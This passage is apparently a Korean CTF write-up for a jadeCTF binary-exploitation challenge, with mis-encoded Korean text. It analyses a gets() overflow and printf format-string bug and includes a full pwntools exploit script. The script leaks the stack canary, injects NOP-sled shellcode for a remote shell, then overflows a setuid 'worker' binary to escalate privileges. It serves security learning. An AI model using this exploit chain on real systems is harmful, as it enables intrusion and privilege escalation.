class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">enter_coupon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> coupon_code[<span class="number">14</span>]; <span class="comment">// [rsp+70h] [rbp-70h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+7Eh] [rbp-62h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+80h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+D0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(coupon_code, <span class="string">&quot;YCHHZZHHMSHWI&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the coupon code: &quot;</span>);</span><br><span class="line">    gets(input);                                <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, coupon_code) )          <span class="comment">// same as cooupon code</span></span><br><span class="line">    &#123;</span><br><span class="line">      successfull = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Coupon applied successfully!&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid coupon code! You entered: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(input);                              <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !another_chance )                      <span class="comment">// if another_chance = 1 ?</span></span><br><span class="line">      <span class="keyword">break</span>;                                    <span class="comment">// pass</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get one more chance to enter the coupon!&quot;</span>);</span><br><span class="line">    another_chance = <span class="number">0</span>;                         <span class="comment">// if another_chance == 1, </span></span><br><span class="line">                                                <span class="comment">// It can make another_chance = 0.</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No more chances left!&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">if</span> ( successfull != <span class="number">1</span> )                       <span class="comment">// if (input != coupon_code), I can&#x27;t do ROP.</span></span><br><span class="line">                                                <span class="comment">// =&gt; should (input == coupon_code)</span></span><br><span class="line">    choose_option();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ìï¥Îãπ Ìï®ÏàòÎ•º Ïó¥Ïñ¥Î≥¥Î©¥ bofÏôÄ fsb Ï∑®ÏïΩÏ†êÏù¥ ÌïòÎÇòÏî© ÎààÏóê Î≥¥Ïù∏Îã§. </p><p>1Î≤à Î©îÎâ¥ <code>roll_the_dice()</code> Ìï®ÏàòÏóêÏÑú Î¥§Îçò another_chance Ï†ÑÏó≠ Î≥ÄÏàòÏóê Ï£ºÎ™©Ìï¥Î≥¥Ïûê. </p><p>bofÍ∞Ä Î®ºÏ†Ä ÌÑ∞ÏßÄÍ≥† fsbÍ∞Ä Í∑∏ Îã§Ïùå ÌÑ∞ÏßÑÎã§. Í∑∏Î¶¨Í≥† another_chance Ï†ÑÏó≠ Î≥ÄÏàòÎ•º ÏÇ¨Ïö©ÌïúÎã§. ÏñòÍ∞Ä 1Ïù¥Î©¥ breakÍ∞Ä ÎêòÏßÄ ÏïäÍ≥† whileÏùÑ Ìïú Î≤à Îçî Îèå Ïàò ÏûàÍ≤å ÎêúÎã§. Í∑∏Î¶¨Í≥† Ìï¥Îãπ Ï†ÑÏó≠ Î≥ÄÏàòÎ•º 0ÏúºÎ°ú setÌïúÎã§. </p><p>Ïù¥ ÎßêÏùÄ Î≠êÎã§? Î£®ÌîÑÎ•º Îëê Î≤à Îèå Ïàò ÏûàÎã§. Ï¶â, bofÏôÄ fsbÎ•º Ìïú Î≤à Îçî ÌôúÏö©Ìï† Ïàò ÏûàÎã§Îäî Îúª.</p><p>Í∑∏Î¶¨Í≥† ÌîÑÎ°úÍ∑∏Îû® ÌùêÎ¶ÑÏùÑ Î∞îÍæ∏Í∏∞ ÏúÑÌï¥ÏÑú retÎ•º Î∞îÍøîÏ§òÏïºÌïòÎäîÎç∞, Ïù¥Î•º ÏúÑÌï¥ÏÑ† Ìï®Ïàò returnÏùÑ Ìï¥ÏïºÌïúÎã§. ÏΩîÎìúÎ•º Î≥¥Î©¥ coupon_codeÎ•º ÌãÄÎ¶¨Î©¥ successfull Ï†ÑÏó≠ Î≥ÄÏàòÍ∞Ä 0ÏúºÎ°ú Ïú†ÏßÄÎêòÏñ¥ Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÍ∏∞ Ï†ÑÏóê <code>choose_option()</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≤å ÎêúÎã§. Í∑∏Îü¨Î©¥ ÏïàÎêòÍ∏∞ ÎïåÎ¨∏Ïóê coupon_codeÎ•º ÎßûÏ∂∞Ï£ºÏñ¥ÏÑú successfullÏùÑ 1Î°ú setÌï¥Ï§òÏïºÌïúÎã§.</p><p>ÎßàÏπ® Ïä§ÌÉùÏóê Ïö∞Î¶¨Ïùò input Îã§ÏùåÏóê coupon_codeÍ∞Ä ÏúÑÏπòÌïòÍ≥† ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Íµ≥Ïù¥ inputÏóê ‚ÄúYCHHZZHHMSHWI‚ÄùÏùÑ Ï†ÅÏßÄ ÏïäÏïÑÎèÑ Ïö∞ÌöåÌï† Ïàò ÏûàÎã§.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>Ï∑®ÏïΩÏ†êÏùÄ ÏúÑÏóêÏÑú Î¥§ÎìØ <code>enter_coupon()</code> Ìï®ÏàòÏóêÏÑú bofÏôÄ fsbÍ∞Ä Î∞úÏÉùÌïúÎã§. canaryÏôÄ pieÍ∞Ä Í±∏Î†§ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê fsbÎ°ú Ïù¥Í≤ÉÏùÑ Î¶≠Ìï¥ÏïºÌïòÎäî ÌïÑÏöîÏÑ±ÏùÑ ÎäêÎÇÄÎã§. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Ïö∞Î¶¨Îäî bofÏôÄ fsbÍ∞Ä ÏàúÏ∞®Ï†ÅÏúºÎ°ú Îëê Î≤àÏî© ÌÑ∞ÏßÑÎã§. ÏÉùÍ∞ÅÌï¥Î≥¥Î©¥, pieÎ•º Íµ≥Ïù¥ Î¶≠Ìï† ÌïÑÏöîÍ∞Ä ÏóÜÎã§. ÏôúÎÉêÌïòÎ©¥ NX bit disabledÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Ïö∞Î¶¨Îäî Ïä§ÌÉùÏóêÏÑú ÏâòÏΩîÎìúÎ•º Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§.</p><p>stack Ï£ºÏÜåÎ•º Î¶≠Ìï¥ÏÑú Ïö∞Î¶¨Ïùò input bufÏôÄ ÏñºÎßàÎÇò Îñ®Ïñ¥Ï†∏ÏûàÎäîÏßÄ offsetÏùÑ Íµ¨Ìï† Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê return Ï£ºÏÜåÎ•º Í±∞Í∏∞Î°ú ÎèåÎ†§Ï§Ñ Ïàò ÏûàÎã§.</p><p>Ïù¥Îïå ÏùµÏä§ ÌôïÎ•†ÏùÑ ÎÜíÏù¥Í∏∞ ÏúÑÌï¥ NOP SledÎ•º Ìï¥Ï§¨Îã§. Ïù¥ Îïå ÌéòÏù¥Î°úÎìú Íµ¨ÏÑ±ÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\x00`  * (0xd0-0x62) + NOP sled + shellcode + canary + sfp + ret(input buf)</span><br></pre></td></tr></table></figure><p>input ÌÅ¨Í∏∞ÏôÄ coupon_code ÌÅ¨Í∏∞Î•º Ìï©Ïπú ÎßåÌÅº <code>\x00</code>ÏùÑ ÎÑ£Ïñ¥Ï£ºÏóàÎã§. ÌïòÎìúÏΩîÎî©Îêú coupon_codeÏùÑ ÎßûÏ∂∞ÏÑú Ï†ÅÏßÄ ÏïäÏïÑÏ§òÎèÑ strcmpÎ•º ÏÜêÏâΩÍ≤å Ïö∞ÌöåÌï† Ïàò ÏûàÎã§.</p><p>Í∑∏Îüº ÏâòÏΩîÎìú Ïã§ÌñâÏù¥ ÏÑ±Í≥µÌïòÍ≤å ÎêòÍ≥† ÏâòÏùÑ ÌöçÎìùÌï† Ïàò ÏûàÎã§. ÏΩîÎìú ÏÑ§Î™ÖÌï† ÎñÑ Ïñ∏Í∏âÌñàÎìØÏù¥ ÌîåÎûòÍ∑∏Ïùò ÏúÑÏπòÎäî Ï†ï Îã§Î•∏ Í≥≥Ïóê ÏúÑÏπòÌïòÍ≥† ÏûàÎã§. <code>ls -al *</code>ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÏßÑÏßú ÌîåÎûòÍ∑∏Ï≤òÎüº Î≥¥Ïù¥Îäî Í≤ÉÏùÑ Ï∞æÏïÑÎ≥¥ÏïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opt:</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 03:03 .</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 04:05 ..</span><br><span class="line">-rwxr----- 1 0 1001    36 Oct 21 05:21 real_flag.txt</span><br><span class="line">-rwsr-sr-x 1 0 1001 13440 Oct 22 03:03 worker</span><br></pre></td></tr></table></figure><p>ÏßÑÏßú ÌîåÎûòÍ∑∏Îäî <code>/opt/real_flag.txt</code>Ïóê ÏúÑÏπòÌïòÍ≥† ÏûàÎã§. Î¨∏Ï†úÎäî Í∂åÌïúÏù¥ ÏóÜÏñ¥ÏÑú ÌîåÎûòÍ∑∏Î•º ÏùΩÏùÑ ÏàòÍ∞Ä ÏóÜÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /opt/real_flag.txt</span><br><span class="line">cat: /opt/real_flag.txt: Permission denied</span><br></pre></td></tr></table></figure><p>Í∑∏ÎûòÏÑú ÏïÑÎûò setuidÍ∞Ä Í±∏Î¶∞ worker ÌååÏùºÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÌååÏùºÏùÑ Ïã§ÌñâÏãúÌÇ¥ÏúºÎ°úÏç® Í∂åÌïúÏÉÅÏäπÏùÑ Ìï¥Ï§Ä Îí§Ïóê Í∑∏ Í∂åÌïúÏúºÎ°ú read_flag.txtÎ•º ÏùΩÏñ¥Ï§òÏïº ÌïúÎã§.</p><p>Ìïú ÎßàÎîîÎ°ú worker Î∞îÏù¥ÎÑàÎ¶¨Î•º ÏùµÏä§Ìï¥Ïïº ÌïúÎã§. Ïù¥Í≤ÉÏùÑ ÏúÑÌï¥ÏÑú Î¶¨Î™®Ìä∏Ïùò worker Î∞îÏù¥ÎÑàÎ¶¨Î•º Î°úÏª¨Î°ú Î≥µÏÇ¨ÌïòÎäî ÏûëÏóÖÏù¥ ÌïÑÏöîÌïúÎç∞, ÎÇòÎäî base64Î•º Ïù¥Ïö©Ìï¥ÏÑú Î∞îÏù¥ÎÑàÎ¶¨Î•º Î≥µÏÇ¨Ìï¥Ï£ºÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w0 /opt/worker </span><br></pre></td></tr></table></figure><p>Î°úÏª¨ÏóêÏÑú ÌååÏùº ÌïòÎÇò ÎßåÎì§Ïñ¥ÏÑú base64Ìïú Í≤ÉÏùÑ Î∂ôÏù∏ Îã§Ïùå ÎîîÏΩîÎî©ÏùÑ ÌïòÎ©¥ ÎêúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi aa</span><br><span class="line">base64 -d aa &gt; worker</span><br><span class="line">chmod +x worker</span><br></pre></td></tr></table></figure><p>Ïù¥ worker Î∞îÏù¥ÎÑàÎ¶¨Î•º ÏùµÏä§ÌïòÍ≤å ÎêòÎ©¥ worker Í∂åÌïúÏúºÎ°ú Í∂åÌïú ÏÉÅÏäπÏù¥ ÎêòÏóàÍ∏∞ ÎïåÎ¨∏Ïóê ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú real_flag.txtÎ•º ÏùΩÏùÑ Ïàò ÏûàÎã§. worker Î∞îÏù¥ÎÑàÎ¶¨ ÏùµÏä§Îäî Í∞ÑÎã®ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Îî∞Î°ú Ïñ∏Í∏âÌïòÏßÄ ÏïäÍ≤†Îã§.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h4><ol><li>case 5 Ïã§ÌñâÌï† ÎïåÍπåÏßÄ 1Î≤à Î©îÎâ¥ Ïã§Ìñâ</li><li>2Î≤à Î©îÎâ¥ÏóêÏÑú canary Î∞è stack Ï£ºÏÜå Î¶≠Ìïú ÌõÑ, input buf Ï£ºÏÜå Í≥ÑÏÇ∞ (Ï≤´ Î≤àÏß∏ Î£®ÌîÑ)</li><li>payload Íµ¨ÏÑ± (Îëê Î≤àÏß∏ Î£®ÌîÑ)<ul><li><code>\x00</code>‚Ä¶ + NOP sled + shellcode + canary + sfp + ret(input buf) # <code>\x00</code>ÏúºÎ°ú strcmp Í≤ÄÏÇ¨ ÌÜµÍ≥º</li></ul></li></ol><h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h4><ol start="4"><li>Î¶¨Î™®Ìä∏ ÏâòÏùÑ Îî¥ ÌõÑ &#x2F;opt&#x2F;worker ÏùµÏä§ ÏßÑÌñâ</li><li>Í∂åÌïú ÏÉÅÏäπ ÌõÑ real_flag.txt ÏùΩÍ∏∞</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter</span>(<span class="params">inp</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, inp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roll</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvline()</span><br><span class="line">            want = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;You get another&#x27;</span> <span class="keyword">in</span> want:</span><br><span class="line">                <span class="built_in">print</span>(want)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">roll()</span><br><span class="line"></span><br><span class="line"><span class="comment">## canary 33</span></span><br><span class="line"></span><br><span class="line">enter(<span class="string">&#x27;%33$p %34$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;d: &#x27;</span>)</span><br><span class="line">leak = p.recvline().decode()</span><br><span class="line">canary = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary = int(p.recvline()[2:], 16)</span></span><br><span class="line">info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">buf = stack_leak - <span class="number">0x80</span></span><br><span class="line">info(<span class="string">&#x27;buf :: &#x27;</span> + <span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sh)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xd0</span>-<span class="number">0x62</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(sh), <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += sh</span><br><span class="line">payload += p64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PART 2 ##################################################</span></span><br><span class="line">p.sendline(<span class="string">&#x27;./opt/worker&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x40090c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span>+<span class="number">0x8</span>) </span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="shellcodeÎ•º-ÏïÑÎûòÏ≤òÎüº-Íµ¨ÏÑ±Ìï¥Ï§Ä-Ïù¥Ïú†"><a href="#shellcodeÎ•º-ÏïÑÎûòÏ≤òÎüº-Íµ¨ÏÑ±Ìï¥Ï§Ä-Ïù¥Ïú†" class="headerlink" title="shellcodeÎ•º ÏïÑÎûòÏ≤òÎüº Íµ¨ÏÑ±Ìï¥Ï§Ä Ïù¥Ïú†"></a>shellcodeÎ•º ÏïÑÎûòÏ≤òÎüº Íµ¨ÏÑ±Ìï¥Ï§Ä Ïù¥Ïú†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br></pre></td></tr></table></figure><p><code>shellcraft.sh()</code>ÎßåÌïòÎ©¥ ÏïàÎêòÎÇò? Ïôú <code>sub rsp, 0x1000</code>ÏùÑ Ï∂îÍ∞ÄÌñàÏùÑÍπå? </p><p>ÏóÜÎäî Í≤ΩÏö∞ Ïä§ÌÉùÏùÑ ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ registers ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line"></span><br><span class="line">$rsp   : 0x007ffd7b94f028  ‚Üí  0x0000000000000008</span><br><span class="line">$rip   : 0x007ffd7b94f029  ‚Üí  0x0000000000000000</span><br><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line">   0x7ffd7b94f024                  xor    esi, esi</span><br><span class="line">   0x7ffd7b94f026                  push   rsi</span><br><span class="line">   0x7ffd7b94f027                  push   0x8</span><br><span class="line"> ‚Üí 0x7ffd7b94f029                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02b                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02d                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02f                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f031                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f033                  add    BYTE PTR [rax], al</span><br></pre></td></tr></table></figure><p>.. ÏâòÏΩîÎìúÎ•º Ïã§ÌñâÌïòÎã§Í∞Ä Î©àÏ∑ÑÎã§. ÏâòÏΩîÎìúÍ∞Ä Ï†ÄÏû•Îêú Í≥≥Ïóê Í∞íÏùÑ Ïì∞Í≥† ÏûàÏñ¥ÏÑú ÌïúÎßàÎîîÎ°ú Ïã§ÌñâÌï† ÏΩîÎìúÍ∞Ä Ï†ÄÏû•Îêú Í≥≥Ïù¥ Ïä§ÌÉùÏù∏Îç∞ Í∑∏ Ïä§ÌÉùÏóê Ïù¥Í≤ÉÏ†ÄÍ≤É Ïì∞Î©¥ÏÑú ÏÇ¨Ïö©ÌïòÍ≥† ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Ïã§ÌñâÌï† ÏΩîÎìúÍ∞Ä ÎçîÎüΩÌòÄÏ°åÎã§.</p><p>Í∑∏ÎûòÏÑú <code>sub rsp, 0x1000</code>ÏùÑ Ï∂îÍ∞ÄÌï¥ÏÑú ÏÇ¨Ïö©ÌïòÎäî Ïä§ÌÉùÏù¥Îûë ÏâòÏΩîÎìúÍ∞Ä Ï†ÄÏû•ÎêòÎäî Ïä§ÌÉùÏù¥Îûë Îã§Î•¥Í≤å ÏúÑÏπòÏãúÏºúÏ£ºÏóàÎã§.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;d1d_y0u_l1k3_th3_du4l_pwn?&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ÎåÄÌöå ÎÅùÎÇòÍ≥† ÌíÄÏóàÎã§. Ïù¥ Î∞îÏù¥ÎÑàÎ¶¨ÏóêÏÑú Ï∑®ÏïΩÏ†êÏùÄ ÎπÑÍµêÏ†Å Ï∞æÍ∏∞ ÏâΩÏßÄÎßå.. flagÎ•º ÏñªÍ∏∞ ÏúÑÌïú Í≥ºÏ†ïÏù¥ ÏàúÌÉÑÏπò ÏïäÏïòÎã§‚Ä¶‚Ä¶‚Ä¶.. ÏÉàÎ°≠Í≤å ÏïåÍ≤åÎêú Í≤ÉÏù¥ ÏûàÎã§. base64Î•º Ïù¥Ïö©Ìï¥ÏÑú Î¶¨Î™®Ìä∏ ÌååÏùºÏùÑ Î≥µÏÇ¨Ìï¥Ïò®Îã§Îäî Ï†ïÎèÑ? </p><p>Í∑∏Î¶¨Í≥† ÏõêÎûò ÏïåÍ≥† ÏûàÏóàÏßÄÎßå Î¨∏Ï†ú ÌíÄ Îïå Î¶¨ÎßàÏù∏Îìú Îêú Í≤ÉÎì§.<br>ÏòàÎ•º Îì§Î©¥ return addressÎ•º Í±¥Îì§Í∏∞ ÏúÑÌï¥ÏÑúÎäî Ìï®Ïàò returnÏùÑ Ìï¥Ï§òÏïº ÌïúÎã§Í±∞ÎÇò, NX bitÍ∞Ä Ìï¥Ï†úÎêòÏñ¥ ÏûàÏúºÎ©¥ Ïä§ÌÉùÏóêÏÑú ShellcodeÎ•º Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÍ≥†, Ïù¥Îïå ÏùµÏä§ ÌôïÎ•†ÏùÑ ÎÜíÏù¥Í∏∞ ÏúÑÌï¥ÏÑú NOP SledÎ•º Ìï† Ïàò ÏûàÎã§Îäî Í≤É Ï†ïÎèÑ?</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
